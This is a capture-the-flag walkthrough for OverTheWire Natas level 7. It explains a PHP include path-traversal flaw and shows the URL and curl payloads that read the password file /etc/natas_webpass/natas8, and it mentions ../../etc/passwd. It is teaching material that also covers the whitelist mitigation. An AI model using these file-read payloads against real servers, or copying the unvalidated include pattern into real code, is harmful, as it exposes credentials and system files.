# OverTheWire: Natas — Level 7 → Level 8

> **Vulnerability:** Path Traversal via Unsanitised `include` Parameter                                                      
> **Skills:** PHP `include`, GET parameters, Linux file system, path traversal                                                       
> **Difficulty:** Easy                                                                       
> [Official Page](https://overthewire.org/wargames/natas/natas7.html)

---

## Access

- **URL:** `http://natas7.natas.labs.overthewire.org`
- **Username:** `natas7`
- **Password:** *obtain from previous level*

---

## Task

Find the password for `natas8` by exploiting an unsanitised file inclusion parameter to read a password file stored outside the web root.

---

## Vulnerability

This level demonstrates a **path traversal attack** (also called directory traversal) caused by **unsanitised user input passed directly to a PHP `include` statement**. The page uses a GET parameter (`?page=`) to decide which file to load and display. The developer passes this value to PHP's `include` without any validation or restriction, which means a visitor can supply any file path on the server — not just the intended page files — and have its contents served back to them. Because PHP's `include` accepts absolute paths, no `../` traversal sequences are even required here; pointing the parameter directly at `/etc/natas_webpass/natas8` is sufficient. The developer should have used a whitelist of permitted page names and never passed raw user input to a file-loading function.

---

## Theory

### The Linux file system and path types

Linux organises all files in a single tree rooted at `/` (the root directory). Understanding two types of paths is essential for path traversal:

| Path type | Format | Example | Meaning |
|---|---|---|---|
| Absolute path | Starts with `/` | `/etc/natas_webpass/natas8` | Always starts from the filesystem root — unambiguous regardless of the current working directory |
| Relative path | Does not start with `/` | `pages/home.php` or `../../etc/passwd` | Interpreted relative to the current working directory |

The `../` sequence means "go up one directory level." Chaining multiple `../` sequences (e.g. `../../../../etc/passwd`) is the classic path traversal technique for escaping a restricted directory. In this level that is not even necessary because the parameter is passed directly to `include` with no base path prepended, so an absolute path works immediately.

### The web root vs the server file system

The **web root** is the directory the web server is configured to serve publicly — typically something like `/var/www/html/`. Files inside the web root are reachable by URL. Files outside it — including system files like `/etc/passwd` or `/etc/natas_webpass/natas8` — are not directly accessible via HTTP under normal circumstances. A path traversal vulnerability breaks this boundary by tricking the server-side application into reading and returning files from anywhere on the file system, not just the web root.

### PHP `include` and GET parameters

PHP's `include` statement loads a file and executes it (if it contains PHP) or outputs its contents. When a developer uses a GET parameter to select which file to include, the pattern looks like this:

```php
<?php
include($_GET['page']);
?>
```

When a visitor requests `index.php?page=home.php`, PHP loads `home.php`. When a visitor requests `index.php?page=/etc/natas_webpass/natas8`, PHP attempts to load `/etc/natas_webpass/natas8` — a file that has nothing to do with the web application. If the process running the web server has read permission on that file, its contents are returned to the browser.

### The `/etc/natas_webpass/` directory

The Natas wargame stores each level's password in a dedicated file at `/etc/natas_webpass/natasX`. Each file is readable only by the user that owns that level and by the user of the next level. The web process for `natas7` runs with sufficient privileges to read `/etc/natas_webpass/natas8` — that is intentional to make the level solvable — but not to read files belonging to other levels.

### PHP concepts in this level

| Concept | What it does | Used in this level? |
|---|---|---|
| `$_GET['key']` | Reads a value from the URL query string (e.g. `?key=value`) | Yes — `$_GET['page']` is the vulnerable parameter |
| `include($path)` | Loads and outputs or executes the file at `$path` | Yes — this is the sink that makes traversal possible |
| Absolute path in `include` | PHP accepts `/full/path/to/file` directly, no traversal needed | Yes — the exploit uses an absolute path |
| `../` traversal sequence | Moves up one directory level in a relative path | No — not needed here, but the standard technique in other contexts |
| Input whitelist validation | Checking that input matches one of a fixed set of permitted values before use | No — the absence of this is the vulnerability |

---

## Solution

### Step 1: Load the page and observe the navigation

Navigate to `http://natas7.natas.labs.overthewire.org` and log in. The page displays two navigation links:

```
Home | About
```

Clicking **Home** changes the URL to:

```
http://natas7.natas.labs.overthewire.org/index.php?page=home
```

Clicking **About** changes it to:

```
http://natas7.natas.labs.overthewire.org/index.php?page=about
```

> **What to notice:** The `page` parameter in the URL is controlling which content is displayed. The value changes between `home` and `about` depending on which link is clicked. This is a classic pattern for PHP file inclusion — the application is almost certainly passing this value to `include` or a similar function server-side. Any parameter that selects a file by name is worth testing for path traversal.

---

### Step 2: View the page source for the developer hint

Press `Ctrl+U` to view the raw HTML source of the page. Inside the source you will find an HTML comment:

```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

The full relevant portion of the source:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
</head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

</div>
</body>
</html>
```

> **What to notice:** The comment tells you exactly which file contains the password: `/etc/natas_webpass/natas8`. This is an absolute path on the server's file system. Combined with the `?page=` parameter you identified in Step 1, the approach is straightforward — supply that absolute path as the value of `page` and see whether the server reads and returns the file.

---

### Step 3: Construct and submit the path traversal payload

Modify the URL directly in your browser's address bar. Replace the value of the `page` parameter with the absolute path to the password file:

```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

Press `Enter`.

The page loads and displays the password in the content area where `home` or `about` content would normally appear:

```
[password for natas8]
```

> **What to notice:** PHP's `include` received `/etc/natas_webpass/natas8` as its argument, treated it as a file path, read the file, and output its contents directly into the page. No `../` sequences were required because an absolute path bypasses any directory-relative restrictions entirely. The server applied no validation whatsoever to the `page` parameter — it accepted any string and passed it straight to `include`.

---

### Step 4 (alternative): Use curl to retrieve the password

The same result can be obtained from the command line:

```bash
curl 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8' \
  -H 'Authorization: Basic <base64-credentials>'
```

The response will be the full HTML of the page with the password embedded in the content div:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
</head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
[password for natas8]
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

</div>
</body>
</html>
```

> **What to notice:** The password appears as plain text inside the `<div id="content">` block, exactly where page content is normally rendered. The HTML comment hint is also visible here, confirming the file structure the developer left in place.

---

## Password for Next Level

```
[retrieve from the page content after submitting the traversal payload on the live server]
```

---

## Key Takeaways

Passing unsanitised user input to PHP's `include` (or `require`, `file_get_contents`, `fopen`, or any other file-loading function) allows an attacker to read arbitrary files from the server's file system, limited only by the permissions of the web server process. Path traversal does not always require `../` sequences — when a function accepts absolute paths and the input is passed through directly, pointing at any absolute path is sufficient. The correct mitigation is a strict whitelist: check that the input matches one of a known set of permitted values before using it, and never construct file paths from raw user input.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Using `../` traversal sequences unnecessarily | May still work, but adds complexity — `../../../../etc/natas_webpass/natas8` is harder to construct correctly than the direct absolute path | Since the parameter is passed to `include` without a prepended base path, an absolute path works directly |
| Requesting `/etc/natas_webpass/natas7` instead of `natas8` | Returns the current level's own password, which you already know | The target is always the *next* level's password file — `natas8` here |
| Requesting other password files (e.g. `natas9`, `natas1`) | The server returns a blank page or an error — the web process does not have read permission on those files | Only `natas8`'s file is readable by the `natas7` web process by design |
| Forgetting the leading `/` in the absolute path | PHP interprets the path as relative to the current working directory and cannot find the file | The path must start with `/` to be treated as absolute: `/etc/natas_webpass/natas8` |
| Trying the payload on the `home` or `about` page directly | There is no separate page to exploit — the parameter is in `index.php` | The payload goes into `index.php?page=` — not a sub-page |
